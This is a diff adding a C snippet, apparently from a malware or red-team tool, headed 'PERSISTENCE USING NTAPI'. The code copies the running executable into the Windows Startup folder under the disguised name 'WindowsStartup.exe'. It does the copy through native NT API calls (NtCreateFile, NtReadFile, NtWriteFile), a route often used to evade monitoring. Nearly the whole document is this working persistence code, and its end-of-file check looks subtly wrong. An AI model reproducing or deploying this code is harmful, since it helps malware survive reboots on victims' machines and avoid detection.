@@ -1,0 +1,99 @@
+/*PERSISTENCE USING NTAPI*/
+	/*----------------Get Current Path----------------*/
+	WCHAR PWDbuffer[MAX_PATH];
+	DWORD PWDlength = GetModuleFileNameW(NULL, PWDbuffer, MAX_PATH);
+	if (PWDlength == 0) {
+		warn("Failed to get current directory. Error code: %lu", GetLastError());
+		return EXIT_FAILURE;
+	}
+	/*------------Make copy to startup file-----------*/
+	LPCWSTR lpExistingFileName = PWDbuffer;
+	LPCWSTR lpNewFileName = L"\\??\\C:\\Users\\Admins\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsStartup.exe";
+
+	// Initialize the object attributes
+	OBJECT_ATTRIBUTES oaExistingFile = { 0 };
+	OBJECT_ATTRIBUTES oaNewFile = { 0 };
+	oaExistingFile.Length = sizeof(OBJECT_ATTRIBUTES);
+	oaNewFile.Length = sizeof(OBJECT_ATTRIBUTES);
+	oaExistingFile.Attributes = OBJ_CASE_INSENSITIVE;
+	oaNewFile.Attributes = OBJ_CASE_INSENSITIVE;
+
+	// Initialize the unicode strings
+	UNICODE_STRING usExistingFile = { 0 };
+	UNICODE_STRING usNewFile = { 0 };
+	RtlInitUnicodeString(&usExistingFile, lpExistingFileName);
+	RtlInitUnicodeString(&usNewFile, lpNewFileName);
+	oaExistingFile.ObjectName = &usExistingFile;
+	oaNewFile.ObjectName = &usNewFile;
+
+	// Initialize the file handles
+	HANDLE hExistingFile = NULL;
+	HANDLE hNewFile = NULL;
+
+	// Initialize the IO status blocks
+	IO_STATUS_BLOCK isbExistingFile = { 0 };
+	IO_STATUS_BLOCK isbNewFile = { 0 };
+
+	// Open the existing file for read access
+	status = NtCreateFile(&hExistingFile, GENERIC_READ, &oaExistingFile, &isbExistingFile, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_OPEN, FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
+	if (status != STATUS_SUCCESS) {
+		warn("Failed to open the existing file with error 0x%x", status);
+		// return EXIT_FAILURE;
+	}
+
+	// Create the new file for write access
+	status = NtCreateFile(&hNewFile, GENERIC_WRITE, &oaNewFile, &isbNewFile, NULL, FILE_ATTRIBUTE_NORMAL, 0, FILE_CREATE, FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
+	if (status != STATUS_SUCCESS) {
+		warn("Failed to create the new file with error 0x%x", status);
+		NtClose(hExistingFile);
+		return EXIT_FAILURE;
+	}
+
+	// Allocate the buffer
+	PVOID pBuffer = malloc(BUFFER_SIZE);
+	if (pBuffer == NULL) {
+		warn("Failed to allocate the buffer");
+		NtClose(hExistingFile);
+		NtClose(hNewFile);
+		return EXIT_FAILURE;
+	}
+
+	// Initialize the byte offset
+	LARGE_INTEGER liByteOffset = { 0 };
+
+	// Copy the file contents
+	while (TRUE) {
+		status = NtReadFile(hExistingFile, NULL, NULL, NULL, &isbExistingFile, pBuffer, BUFFER_SIZE, &liByteOffset, NULL);
+		if (status != STATUS_SUCCESS) {
+			if (status == EOF) break;
+			else {
+				warn("Failed to read from the existing file with error 0x%x", status);
+				free(pBuffer);
+				NtClose(hExistingFile);
+				NtClose(hNewFile);
+				return EXIT_FAILURE;
+			}
+		}
+
+		// Write to the new file
+		status = NtWriteFile(hNewFile, NULL, NULL, NULL, &isbNewFile, pBuffer, isbExistingFile.Information, &liByteOffset, NULL);
+		if (status != STATUS_SUCCESS) {
+			warn("Failed to write to the new file with error 0x%x", status);
+			free(pBuffer);
+			NtClose(hExistingFile);
+			NtClose(hNewFile);
+			return EXIT_FAILURE;
+		}
+
+		// Increment the byte offset
+		liByteOffset.QuadPart += isbExistingFile.Information;
+	}
+
+	// Free the buffer
+	free(pBuffer);
+
+	// Close the file handles
+	NtClose(hExistingFile);
+	NtClose(hNewFile);
+
+	okay("CopyFile succeeded");
